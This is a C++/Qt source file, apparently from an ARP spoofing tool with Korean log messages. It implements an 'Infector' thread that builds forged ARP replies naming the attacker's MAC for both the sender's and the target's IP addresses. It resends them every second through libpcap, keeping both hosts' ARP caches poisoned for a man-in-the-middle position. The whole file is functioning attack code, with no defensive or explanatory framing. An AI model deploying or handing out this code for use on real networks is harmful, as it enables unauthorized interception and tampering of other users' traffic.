#include "infector.h"
#include "pcap.h"

Infector::Infector(const IpFlow& flow, QObject* parent)
    : QThread(parent), flow(flow)
{
    if (flow.handle == nullptr) {
        fprintf(stderr, "[ERROR] Infector: handle is null\n");
        return;
    }

    senderInfectionPacket.eth_.dmac_ = flow.sender_mac;
    senderInfectionPacket.eth_.smac_ = flow.my_mac;
    senderInfectionPacket.eth_.type_ = htons(EthHdr::Arp);

    senderInfectionPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    senderInfectionPacket.arp_.pro_ = htons(EthHdr::Ip4);
    senderInfectionPacket.arp_.hln_ = Mac::Size;
    senderInfectionPacket.arp_.pln_ = Ip::Size;
    senderInfectionPacket.arp_.op_ = htons(ArpHdr::Reply);
    senderInfectionPacket.arp_.smac_ = flow.my_mac;
    senderInfectionPacket.arp_.sip_ = htonl(flow.target_ip);
    senderInfectionPacket.arp_.tmac_ = flow.sender_mac;
    senderInfectionPacket.arp_.tip_ = htonl(flow.sender_ip);

    targetInfectionPacket.eth_.dmac_ = flow.target_mac;
    targetInfectionPacket.eth_.smac_ = flow.my_mac;
    targetInfectionPacket.eth_.type_ = htons(EthHdr::Arp);

    targetInfectionPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    targetInfectionPacket.arp_.pro_ = htons(EthHdr::Ip4);
    targetInfectionPacket.arp_.hln_ = Mac::Size;
    targetInfectionPacket.arp_.pln_ = Ip::Size;
    targetInfectionPacket.arp_.op_ = htons(ArpHdr::Reply);
    targetInfectionPacket.arp_.smac_ = flow.my_mac;
    targetInfectionPacket.arp_.sip_ = htonl(flow.sender_ip);
    targetInfectionPacket.arp_.tmac_ = flow.target_mac;
    targetInfectionPacket.arp_.tip_ = htonl(flow.target_ip);
}

Infector::~Infector() {
    stop();
    wait();
    emit logMessage("[Infector] 스레드 종료");
}

void Infector::trigger() {
    QMutexLocker locker(&mutex);
    triggered = true;
    cond.wakeOne();
}

void Infector::stop() {
    QMutexLocker locker(&mutex);
    running = false;
    cond.wakeOne();
}

void Infector::run() {
    emit logMessage("[Infector] 스레드 시작");

    QElapsedTimer timer;
    timer.start();

    while (running) {
        {
            QMutexLocker locker(&mutex);
            cond.wait(&mutex, 50);

            if (!running) break;

            if (triggered) {
                triggered = false;
                sendInfection(true);
            }
        }

        if (timer.elapsed() >= 1000) {
            sendInfection(true);
            sendInfection(false);
            timer.restart();
        }
    }
}

void Infector::sendInfection(bool toSender) {
    EthArpPacket* packet = nullptr;

    if (toSender) {
        packet = &senderInfectionPacket;
    } else {
        packet = &targetInfectionPacket;
    };

    QMutexLocker locker(&pcapSendMutex);
    int res = pcap_sendpacket(flow.handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        emit fatalError("[Infector] 패킷 전송 실패: " + QString(pcap_geterr(flow.handle)));
    }
}
